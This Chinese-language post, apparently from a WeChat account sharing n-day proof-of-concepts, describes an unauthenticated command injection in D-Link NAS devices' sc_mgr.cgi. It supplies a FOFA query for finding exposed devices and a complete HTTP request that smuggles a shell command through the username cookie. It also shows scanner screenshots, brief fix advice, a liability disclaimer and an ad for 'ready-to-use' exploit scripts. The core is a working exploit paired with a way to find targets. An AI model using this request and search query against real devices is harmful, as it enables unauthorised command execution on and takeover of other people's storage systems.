#  D-Link NAS设备 sc_mgr.cgi 未授权RCE漏洞   
Superhero  nday POC   2024-11-29 08:27  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCkYN4sZibCVo6EFo0N9b7Kib4I4N6j6Y10tynLOdgov9ibUmaNwW5yeoCbQ/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCkhic5lbbPcpxTLtLccZ04WhwDotW7g2b3zBgZeS5uvFH4dxf0tj0Rutw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCk524CiapZejYicic1Hf8LPt8qR893A3IP38J3NMmskDZjyqNkShewpibEfA/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
内容仅用于学习交流自查使用，由于传播、利用本公众号所提供的  
POC  
信息及  
POC对应脚本  
而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号nday poc及作者不为此承担任何责任，一旦造成后果请自行承担！如文章有侵权烦请及时告知，我们会立即删除文章并致歉。谢谢！  
  
  
**00******  
  
**产品简介**  
  
  
D-LinK NAS设备是一种基于网络的存储解决方案，作为网络存储设备，旨在为企业提供大容量的存储空间，并通过网络连接实现数据的访问和管理。这种设备不仅满足了企业对数据存储的需求，还提供了高效的数据共享和访问功能，提升了企业数据管理的效率和灵活性。广泛应用于各种企业场景，如文档存储、图片和视频存储、数据库备份等。特别是在需要高效数据共享和访问的企业环境中，如设计工作室、 广告 公司、医疗机构等，D-Link NAS设备更是发挥了其强大的功能和优势。  
  
  
**01******  
  
**漏洞概述**  
  
  
D-Link NAS设备 /cgi-bin/sc_mgr.cgi?cmd=SC_Get_Info 接口存在远程命令执行漏洞，未经身份验证的远程攻击者可利用此漏洞执行任意系统命令，写入后门文件，获取服务器权限。  
  
  
**02******  
  
**搜索引擎**  
  
  
FOFA:  
```
body="/cgi-bin/login_mgr.cgi" && body="cmd=cgi_get_ssl_info"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwK47Rum3GeXH0FgdtOjtQ9mjEwc3SbY10c9wIoDftsmeIhVXf2xoFO9pVO0sOHAmgMrMeDibBD4xXw/640?wx_fmt=png&from=appmsg "")  
  
  
**03******  
  
**漏洞复现**  
```
GET /cgi-bin/sc_mgr.cgi?cmd=SC_Get_Info HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: */*
Accept-Encoding: gzip, deflate
Connection: close
Cookie: username=mopfdfsewo'& id & echo 'mopfdfsewo;
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwK47Rum3GeXH0FgdtOjtQ9mhbWJYYZibXhIGfGI6RpOjHqnpN6iaF3OLRDdFq3sO9mHhbSoXF7MVAUw/640?wx_fmt=png&from=appmsg "")  
  
  
**04**  
  
**检测工具**  
  
  
nuclei  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwK47Rum3GeXH0FgdtOjtQ9mEmYiboSQOWBZhle7sF4G2AXtjOdy7zk04wX9aYjwAicR6qwViad3FVLqg/640?wx_fmt=png&from=appmsg "")  
  
afrog  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwK47Rum3GeXH0FgdtOjtQ9ms50LSsJkDUsCL7slKjWk6JLuh91CFa9YcVibkDTNIotHtbE4OfkbAug/640?wx_fmt=png&from=appmsg "")  
  
xray  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwK47Rum3GeXH0FgdtOjtQ9mYZ2eAvhtClUQT35TicibGygQuw07PtUf5dLsZsicGoGlEibzDTx9KicrczQ/640?wx_fmt=png&from=appmsg "")  
  
  
**05******  
  
**修复建议**  
  
  
1、关闭互联网暴露面或接口设置访问权限  
  
2、 受影响的设备用户应密切关注 D-Link 即将提供的任何安全补丁。  
  
  
**06******  
  
**内部圈子介绍**  
  
  
1、本圈子主要是分享网上公布的1day/nday POC详情及对应检测脚本，目前POC脚本均支持xray、afrog、nuclei等三款常用工具。  
  
2、三款工具都支持内置poc+自写poc目录一起扫描。  
  
3、保持每周更新10-15个poc。  
  
4、所发布的POC脚本均已测试完毕，直接拿来即用。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwI0X77l5WtnpfTexA6RwHXSbf1x3ZyT3bhcbWzRoFLyAgHkSMk9yGaZK5FDGcSCQp9ibPcicxHXIOcg/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&retryload=2&tp=webp "")  
  
  
  
